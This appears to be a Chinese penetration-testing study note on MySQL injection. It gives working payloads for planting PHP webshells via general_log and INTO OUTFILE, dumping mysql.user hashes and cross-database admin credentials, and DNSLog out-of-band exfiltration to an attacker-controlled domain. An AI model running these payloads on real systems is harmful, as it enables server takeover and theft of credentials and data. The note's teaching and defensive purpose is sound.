## 一、核心前提：为什么账号权限不同，利用思路要分开讲

MySQL 和操作系统一样有**账号权限体系**：`root`（超级管理员）几乎什么都能干，而很多网站实际连接数据库用的是一个专门新建的、**只给了必要权限**的普通账号。这两种账号拿到注入点之后，能做的事情天差地别：

| 能力 | root 用户 | 权限受限的普通用户 |
|---|---|---|
| 查询数据 | 能查所有库、所有表 | 通常只能查自己被授权访问的那一个/几个库 |
| 读写服务器本地文件 | 默认拥有 `FILE` 权限，可以读写磁盘文件 | 默认没有 `FILE` 权限，读写文件会直接报错/无效 |
| 查看所有数据库名 | `information_schema.schemata` 能看到服务器上**所有**数据库 | 只能看到自己有权限的那几个 |

**这对渗透测试的现实意义**：拿到一个 SQL 注入点后，**第一件该做的事，不是急着拼 payload 偷数据，而是先确认当前连接数据库用的是什么权限的账号**——这决定了你接下来该走"偷数据"这条相对保守的路，还是可以尝试"直接写入后门，拿下整个服务器"这条更有破坏力的路。

## 二、实验 1：root 与普通用户的两个核心差异

### 2.1 文件读写操作权限

对应 MySQL 的 `FILE` 权限——有这个权限的账号，可以用 `LOAD_FILE()` 函数读取服务器本地任意（权限允许范围内）文件内容，也可以用 `INTO OUTFILE` 把查询结果写入服务器本地文件。**没有这个权限，这两个操作直接报错，相当于这条利用路径被彻底堵死。**

### 2.2 所有数据库名获取范围不同

`root` 查询 `information_schema.schemata` 能看到服务器上部署的**所有**数据库（哪怕和当前注入点所在的业务完全无关的其他项目库）；普通用户只能看到自己被授权的范围。这一点直接关联到本文第四节的"跨库注入"——**只有权限够大，才谈得上"跨库"**。

## 三、实验 2：`secure_file_priv` 开关

### 3.1 这是什么

```sql
show variables like "secure%"
```

`secure_file_priv` 是 MySQL 的一个**系统变量**，专门用来**进一步限制** `LOAD_FILE()`/`INTO OUTFILE`/`INTO DUMPFILE` 这几个文件操作函数的实际可用范围——即使账号本身有 `FILE` 权限，这个变量仍然可能卡住你。它有三种状态：

| 取值                            | 效果                                                    |
| ----------------------------- | ----------------------------------------------------- |
| 空字符串 `''`                     | **不限制**，可以在服务器文件系统的任意目录读写（权限允许的前提下）——最危险、也是攻击者最想看到的状态 |
| 一个具体路径（如 `D:/mysql/uploads/`） | 只能在这个指定目录下读写，读写别的目录会失败                                |
| `NULL`                        | **完全禁止**任何文件读写操作，哪怕账号有 `FILE` 权限也没用                   |

这个变量通过 Windows 下的 `my.ini` 或 Linux 下的 `my.cnf` 配置文件设置，是**运维/DBA 加固服务器时常用的一道防线**。

### 3.2 当 `secure_file_priv` 挡住了你，还有别的路吗

**现实场景**：如果你发现 `secure_file_priv` 被设置成了 `NULL` 或限定了一个和你想写入的网站目录不相关的路径，`LOAD_FILE`/`INTO OUTFILE` 这条直接写 Webshell 的路就走不通了。但这不代表权限够大的账号就没办法了——如果你**同时还找到了一个"能执行任意 SQL 语句"的功能点**（比如后台自带的"SQL 命令执行"调试功能，或者能访问到的 phpMyAdmin 管理界面），就可以绕开 `secure_file_priv` 对 `INTO OUTFILE` 的限制，走另一条路：**修改 MySQL 的日志配置，把日志文件本身变成一个 Webshell**（详见 3.4 节）。

**这里要澄清一个关键区别**：前面几篇笔记讲的"注入点"，本质上是**你的输入被拼进了别人已经写好的一条 SQL 语句里**，你只能通过闭合引号等方式"插队"。而这里说的"能执行任意 SQL 语句的功能点"是完全不同的场景——应用本身就设计了一个输入框，让你**直接提交一整条完整的 SQL 语句去执行**（常见于一些管理后台自带的"数据库管理/SQL 执行"调试功能，或 phpMyAdmin 这类数据库管理工具本身）。这种场景下你不需要考虑"怎么从别人的语句里逃逸出来"，因为你本来就在写一条完整独立的语句——这正是接下来要讲的 `SET GLOBAL ...` 这类"修改全局配置"的操作能够生效的前提，因为这类操作很难拼接进一个普通的业务查询语句里，但在"SQL 命令执行"这种功能点上可以直接执行。

### 3.3 借助 phpMyAdmin 命令执行点获取后台账号密码

如果能访问到网站的 phpMyAdmin（比如弱口令登录成功，或存在未授权访问），它本身就是一个"能直接执行任意 SQL"的管理界面。可以直接查询 MySQL 自带的 `mysql` 库下的 `user` 表：

```sql
SELECT user, authentication_string FROM mysql.user;
-- 老版本 MySQL 字段名可能是 password 而不是 authentication_string
```

**注意区分两个容易搞混的"密码"**：这里查出来的是 **MySQL 数据库账号自己的登录密码哈希**，不是网站后台的登录密码。但现实中很多人会在不同系统之间**复用密码**（数据库密码和网站后台密码用同一套），所以拿到 MySQL 账号密码哈希后，破解出明文，再去尝试登录网站后台账号，是一条实战中真实有效的"曲线救国"路径。

### 3.4 `general_log` 写 Shell（当 `secure_file_priv` 挡住 `INTO OUTFILE` 时的替代方案）

**核心原理**：MySQL 有一个叫"**通用查询日志**"（General Query Log）的功能，开启后会把**服务器收到的每一条 SQL 语句原样记录**进一个日志文件里。关键在于：**这个日志文件存在哪里（路径+文件名），是可以通过 SQL 语句动态修改的**——如果把日志文件的保存路径改到网站能通过浏览器直接访问到的目录下，并且文件名以 `.php` 结尾，那么只要让一条"内容恰好是一句话木马"的 SQL 语句被执行并记录进日志，这个日志文件实际上就变成了一个**可以被服务器当作 PHP 脚本执行的 Webshell**。 

逐句翻译完整操作流程：

```sql
show variables like 'general_log';
```
**人话**：先看看"通用查询日志"这个功能目前是开着还是关着（默认是关闭的）。

```sql
set global general_log=on;
```
**人话**：把这个日志功能打开，从现在开始，服务器执行的每一条 SQL 语句都会被记下来。

```sql
set global general_log_file='D:/phpstudy_pro/WWW/php/55/bypass.php';
```
**人话**：把日志要保存到的文件路径，改成网站根目录下的一个 `.php` 文件（这里用的是 phpStudy 这个本地环境自带的网站目录结构举例）——**这一步是整个技巧的核心**，因为普通情况下日志文件只是一个 `.log` 文本文件，谁也不会去访问它，但改成网站目录下的 `.php` 文件后，这个文件就能被 Web 服务器当作 PHP 代码执行。

```sql
select '<?php @eval($_POST[x]);?>'
```
**人话**：执行这样一条看似"毫无意义"的查询语句（只是查询一个固定的字符串，不涉及任何表）——**它真正的目的不是要这个查询结果本身，而是要让这条 SQL 语句的完整文本被写进刚才设置好的日志文件里**。因为日志记录的内容就是"刚刚执行过的 SQL 语句原文"，所以这句话里包含的那段 PHP 代码（`<?php @eval($_POST[x]);?>`），会被原封不动地写入 `bypass.php` 这个文件。

**最终效果**：访问 `bypass.php`，就得到了一个标准的"一句话木马"——通过 POST 提交参数 `x` 传入任意 PHP 代码，就能在服务器上执行，可以用蚁剑、菜刀等 Webshell 管理工具直接连接。

**为什么这招能绕过 `secure_file_priv`**：`general_log_file` 这个变量**历史上不受 `secure_file_priv` 管控**（这是 MySQL 设计上的一个"口子"，两套限制机制管的是不同的功能模块），所以即使 `INTO OUTFILE` 被 `secure_file_priv` 死死限制住，`general_log` 这条路在很多环境下依然能用。**但要提醒**：这是一个历史上长期存在、但不同版本/发行版可能有差异的技巧，实战中要先验证当前目标环境是否真的可行。

**配套知识：慢查询日志（`slow_query_log`）**，原理和 `general_log` 完全一样，只是触发记录的条件不同——`slow_query_log` 默认只记录"执行时间超过阈值"的查询，所以要稳定利用这条路，通常还需要配合把 `long_query_time` 这个阈值调到 `0`（即"所有查询都算慢查询"），才能确保你想写入日志的那条语句一定会被记录下来。这是原笔记没写但实际操作中容易漏掉的一步。

## 四、跨库注入（Cross-Database Injection）

### 4.1 为什么"跨库"是可能的

在 MySQL 里，"库"（Database/Schema）只是**同一个数据库服务下，用来分类存放数据的逻辑容器**，并不是完全隔离的、各自独立的系统。**只要当前连接使用的账号权限允许，完全可以在一条 SQL 语句里，用"库名.表名"的写法，直接跨库查询当前业务库之外的其他库**，不需要重新建立一次新的数据库连接。

**现实渗透意义**：很多公司为了省事（尤其是中小企业、云服务器合租环境），会把多个不同的项目（比如"官网新闻系统"和"后台管理系统"）**全部部署在同一台 MySQL 服务器上，甚至共用同一个数据库账号**。这意味着：**你找到的可能只是一个看起来无关紧要的小功能点（比如新闻查询）的注入漏洞，但只要这个数据库账号权限够大，就能直接跨到同一服务器上的其他业务库，把真正有价值的数据（比如后台管理员账号）偷出来**——"一个小站点的注入，牵连出整个服务器上所有数据"，正是这个原理。

### 4.2 逐句翻译实战语句

```sql
' union select SCHEMA_name,2,3 from information_schema.SCHEMATA#
```
**人话**：列出当前这个数据库账号能看到的**所有**数据库名，不只是注入点所在的那一个库——这一步是在"踩点"，看看服务器上还有哪些库值得进一步挖。

```sql
' union select table_name,2,3 from information_schema.tables where table_schema='aicms'#
```
**人话**：注意这里查的是 `aicms`——一个和原本注入点所在业务**完全不同**的库，说明上一步已经确认这个账号能看到 `aicms` 这个库，现在主动"跳"过去看它底下有哪些表。

```sql
' union select column_name,2,3 from information_schema.columns where table_name='wolive_admin'#
```
**人话**：`wolive_admin` 这个表名从字面上就能猜到大概率是"管理员表"，查一下它都有哪些列。

```sql
' union select username,2,3 from aicms.wolive_admin#
' union select password,2,3 from aicms.wolive_admin#
```
**人话**：这两句是整个跨库注入的**核心语法**——用 `aicms.wolive_admin` 这种"库名.表名"的写法，**即使当前这条 SQL 语句本来是在另一个库的上下文里执行的，也能直接精准定位到 `aicms` 这个库下的 `wolive_admin` 表**，把管理员的用户名和密码取出来。

## 五、文件操作：读写与路径获取

### 5.1 先搞清楚一个常见误区：网站 URL 路径 ≠ 服务器本地磁盘路径

`LOAD_FILE()` 和 `INTO OUTFILE` 操作的都是**服务器磁盘上的绝对物理路径**（比如 `D:\phpstudy_pro\WWW\news\upload\1.txt`），而不是你平时在浏览器地址栏看到的 URL 路径（比如 `http://xxx.com/news/upload/1.txt`）。这两者之间的对应关系，取决于 Web 服务器的配置（网站根目录具体对应磁盘上的哪个文件夹），**必须先拿到真实的磁盘路径，才能谈文件读写**。

### 5.2 获取网站物理路径的四种思路

| 方法             | 原理                                                                                                                 |
| -------------- | ------------------------------------------------------------------------------------------------------------------ |
| **遗留文件**       | 比如开发调试用的 `phpinfo.php` 探针文件如果忘记删除，直接访问就能在页面上看到 `DOCUMENT_ROOT` 等明确写出完整物理路径的信息                                      |
| **报错显示**       | 如果网站没关闭调试模式（如 PHP 的 `display_errors`），一旦触发报错，框架/语言本身常常会把完整的服务器端文件路径直接打印在错误堆栈里                                      |
| **读中间件配置**     | Apache/Nginx/IIS 的配置文件（如 `httpd.conf`、`nginx.conf`）里会明确写出"网站域名对应磁盘上哪个目录"，如果能通过别的漏洞先读到这些配置文件，就能拿到路径                 |
| **爆破 Fuzz 路径** | 对着常见 CMS、常见服务器环境（如 `phpStudy`、宝塔面板）的默认安装路径做字典枚举，比如 Windows 下常见的 `C:/phpstudy_pro/WWW/`，Linux 下常见的 `/var/www/html/` |

### 5.3 逐句翻译读写语句

```sql
' union select LOAD_FILE('d:\\1.txt'),2,3#
```
**人话**：读取服务器本地 `d:\1.txt` 这个文件的内容，把它当作查询结果的第一列显示出来——**前提条件**：当前数据库账号有 `FILE` 权限，并且 `secure_file_priv` 没有限制这个路径（详见第三节）。

```sql
' union select 'xxxx',2,3 into outfile 'd:\\3.txt'#
```
**人话**：把字符串 `xxxx` 写入到服务器本地的 `d:\3.txt` 文件里。**如果把 `'xxxx'` 换成一句话木马代码（如 `'<?php @eval($_POST[x]);?>'`），同时把目标路径指定到第 5.2 节获取到的、网站能通过浏览器访问到的目录下，这条语句就直接写出了一个 Webshell**——这是在 `secure_file_priv` 没有限制的理想情况下，最直接、最简单的拿 Shell 方式，也正是为什么本文把 `secure_file_priv` 的检查放在最前面的原因：它决定了这条最简单的路能不能走，走不通才需要退而考虑第三节讲的 `general_log` 这条迂回路线。

## 六、带外注入（Out-of-Band，OOB / DNSLog 外带）

### 6.1 为什么需要这最后一种手段

当目标环境**既不回显数据、也不显示报错信息、时间盲注又因为网络延迟不稳定等原因导致判断不可靠**时，还有一种思路：**不等待数据"被动"显示出来，而是让数据库自己"主动"发起一次网络请求，把想要的数据夹带在这次请求里，发送到攻击者自己控制、可以实时查看记录的一台服务器上**——相当于不再"偷看"，而是让数据库自己把数据"快递"给你，整个过程不需要任何页面回显、报错或计时判断。

### 6.2 工作原理拆解

这个技巧巧妙利用了一个和 SQL 注入本身无关的"副作用"：

1. `LOAD_FILE()` 函数本意是读取一个文件，但如果你给它传入的是 **Windows 的 UNC 路径格式**（`\\服务器地址\共享目录\文件名`，用来访问"网络共享文件夹"的标准写法），**在 Windows 系统真正去访问这个网络共享资源之前，必须先对路径里的"服务器地址"部分做一次 DNS 域名解析**——这一步解析动作，是我们真正想要触发的东西，"读文件"这个表面目的反而不重要（甚至大概率会失败，但不影响我们已经达到目的）。
2. **把想偷取的数据，通过 `concat()` 拼接成这个"服务器地址"域名的一部分**。DNS 域名本身对每一段（用 `.` 分隔）允许是任意字符串，所以数据库名、表名这些数据，被巧妙地伪装成了一段"看起来毫无意义，但格式合法"的子域名。
3. 这个被拼出来的子域名，随着 DNS 解析请求，被发送到了**攻击者自己控制、能看到解析记录日志的一台 DNS 服务器**（例子里的 `yjjoxijrhw.yutu.eu.org`，从命名特征看是某个 DNSLog 平台——类似 `dnslog.cn`、`ceye.io` 这类工具——自动生成的专属子域名）。攻击者打开这个平台的后台，就能看到完整的解析记录，记录里那段"看起来毫无意义"的子域名，正是数据库偷偷"快递"过来的真实数据。

### 6.3 逐句翻译

```sql
' union select load_file(concat('\\\\',(select database()),'.yjjoxijrhw.yutu.eu.org\\aa')),2,3#
```
**人话**：把当前数据库名拼接成 `数据库名.yjjoxijrhw.yutu.eu.org` 这样一个完整的域名，前面补上 UNC 路径固定的开头 `\\`，后面随便补一个共享文件夹名 `\aa`（这部分不影响前面的 DNS 解析，只是为了让整个 UNC 路径在语法上看起来完整）。这整个拼好的字符串交给 `load_file()` 去"读取"——Windows 在真正尝试访问之前，一定会先对拼出来的域名发起 DNS 查询，攻击者在 DNSLog 平台上就能看到类似 `news_management.yjjoxijrhw.yutu.eu.org` 这样一条解析记录，从而知道了数据库名叫 `news_management`。

```sql
' union select load_file(concat("\\\\",(select table_name from information_schema.tables where table_schema='news_management' limit 0,1 ),".yjjoxijrhw.yutu.eu.org\\xxx.txt")),2,3#
```
**人话**：原理完全一样，只是这次拼进域名里的内容，从"数据库名"换成了 `news_management` 这个库下的**第一张表名**（`limit 0,1` 代表"从第 0 条开始，取 1 条"，也就是第一条记录）。

```sql
' union select load_file(concat("\\\\",(select table_name from information_schema.tables where table_schema='news_management' limit 0,2 ),".yjjoxijrhw.yutu.eu.org\\xxx.txt")),2,3#
```
**人话**：和上一句几乎一模一样，唯一区别是 `limit 0,2` 变成了"取 2 条记录"——通过不断调整 `limit` 的参数（偏移量和条数），**一条一条地把这个库下所有的表名，分别拼成不同的域名，一次次通过 DNS 请求"带"出来**。

**查列名（原笔记在这里被截断）**：按同样的思路可以推出来——把子查询从"查表名"换成"查列名"（即 `select column_name from information_schema.columns where table_name='xxx'`），拼接到域名里的方式完全一致，只是换了要查询的系统表和筛选条件。

## 七、这些手法共同的现实意义（渗透视角总结）

1. **权限决定了注入漏洞的"上限"**：同一个 SQL 注入漏洞，如果 Web 应用连接数据库用的是 `root` 这种高权限账号，危害可以从"偷数据"直接升级为"拿到服务器的完整控制权（Webshell）"。从防御角度看，**Web 应用连接数据库应该使用权限最小化的专用账号**（只给业务必需的增删改查权限，绝不给 `FILE` 权限），这是从根本上限制该类攻击升级空间最有效的办法。
2. **`secure_file_priv`、`general_log` 这类系统变量，本质上是运维/DBA 安全加固层面的配置项**。实战中养成"先查一遍这些变量状态"的习惯（`show variables like 'xxx'`），能快速判断当前权限下到底能把攻击推进到哪一步，而不是上来就盲目尝试所有手法浪费时间。
3. **跨库注入提醒我们：审计一个小站点时不能只盯着这个站点本身的数据**，数据库账号的权限范围可能远超这个站点本身，云服务器、合租服务器环境下，多个项目共用同一个 MySQL 实例是非常常见的现象，一个边缘小功能的注入漏洞，可能牵连出整个服务器上所有项目的数据。
4. **带外注入是"山穷水尽"时的最后手段**，原理不局限于 MySQL 的 `LOAD_FILE`，核心思路是"**利用某个函数处理网络路径时产生的副作用，诱导目标服务器主动发起一次对外连接请求**"。这个思路在其他技术栈里也有对应的变体——回忆一下《Java_JavaEE全景速成笔记》里讲过的 JNDI 注入，本质上也是"诱导服务器主动发起一次网络请求（通过 RMI/LDAP/DNS）"这同一套思路，只是触发的场景和利用的具体机制不同。理解了这一次 MySQL 带外注入的原理，再回头看 JNDI 注入会容易很多。
